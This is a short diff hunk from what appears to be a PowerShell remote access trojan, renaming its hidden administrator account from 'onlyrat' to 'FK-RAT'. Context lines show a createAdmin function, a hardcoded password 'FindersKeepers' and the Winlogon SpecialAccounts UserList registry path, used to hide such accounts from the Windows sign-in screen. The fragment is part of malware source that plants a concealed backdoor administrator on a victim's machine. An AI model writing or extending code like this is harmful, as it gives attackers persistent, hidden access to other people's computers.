@@ -24,7 +24,7 @@ function createAdmin {
 $temp = "$env:temp"
 $dirName = randomText
 
-$uName = "onlyrat"
+$uName = "FK-RAT"
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 
 $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
